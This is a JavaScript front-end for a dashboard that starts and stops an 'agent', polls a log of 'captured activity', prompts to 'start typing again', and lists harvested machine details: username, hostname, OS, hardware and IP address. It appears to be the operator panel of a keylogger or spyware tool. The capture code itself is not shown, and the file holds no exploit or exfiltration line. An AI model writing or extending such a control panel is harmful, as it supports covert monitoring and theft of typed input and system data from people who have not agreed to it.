function controlAgent(action) {
    fetch("/" + action, { method: "POST" })
        .then(() => console.log("Agent " + action + "ed"))
        .catch(err => console.log("Error: " + err));
}

function fetchPeople() {
    const unique = new Date().getTime();
    fetch("/people?nocache=" + unique)
        .then(res => res.text())
        .then(data => {
            document.getElementById("people-output").innerText = data || "[No activity captured yet]";
        })
        .catch(err => console.error("Error fetching data:", err));
}
function reloadSession() {
    fetch("/reload", { method: "POST" })
        .then(() => {
            document.getElementById("people-output").innerText = "[Log cleared. Start typing again.]";
            alert("Log cleared");
        })
        .catch(err => alert("Error: " + err));
}

function downloadLog() {
    window.location.href = "/download";
}

function copyToClipboard() {
    const text = document.getElementById("people-output").innerText;
    navigator.clipboard.writeText(text)
        .then(() => alert("Copied to clipboard!"));
}

function toggleAgent(checkbox) {
    const slider = document.getElementById("slider-square");
    const toggleTrack = document.getElementById("toggle-track");
    const navbar = document.querySelector(".navbar");

    if (checkbox.checked) {
        slider.textContent = "START";
        toggleTrack.style.backgroundColor = "#ccffcc";
        navbar.style.backgroundColor = "#54b654"; // light green
        controlAgent('start');
    } else {
        slider.textContent = "STOP";
        toggleTrack.style.backgroundColor = "#ffcccc";
        navbar.style.backgroundColor = "#fa3b3b"; // light red
        controlAgent('stop');
    }
}
let intervalId = null;
function interval_set() {
    const interval = parseInt(document.getElementById("interval").value);
    clearInterval(intervalId);
    intervalId = setInterval(fetchPeople, interval * 1000);
}


window.addEventListener("DOMContentLoaded", () => {
    interval_set(); // Start default interval

    // Update interval when select changes
    document.getElementById("interval").addEventListener("change", interval_set);
});

window.onload = function () {
    const toggle = document.getElementById("agent-toggle");
    toggleAgent(toggle);
};

function fetchUserInfo() {
    fetch('/api/userinfo')
        .then(response => response.json())
        .then(data => {
            if (!data || data.length === 0) {
                alert("No user info collected yet.");
                return;
            }

            const latest = data[data.length - 1];

            document.getElementById("username").innerText = latest.username || "N/A";
            document.getElementById("hostname").innerText = latest.hostname || "N/A";
            document.getElementById("os").innerText = latest.os || "N/A";
            document.getElementById("os_version").innerText = latest.os_version || "N/A";
            document.getElementById("platform").innerText = latest.platform || "N/A";
            document.getElementById("architecture").innerText = latest.architecture || "N/A";
            document.getElementById("processor").innerText = latest.processor || "N/A";
            document.getElementById("cpu_count").innerText = latest.cpu_count || "N/A";
            document.getElementById("ram_gb").innerText = latest.ram_gb + " GB" || "N/A";
            document.getElementById("current_time").innerText = latest.current_time || "N/A";
            document.getElementById("ip_address").innerText = latest.ip_address || "N/A";
        })
        .catch(err => {
            console.error("Failed to fetch user info:", err);
            alert("Error fetching system info.");
        });
}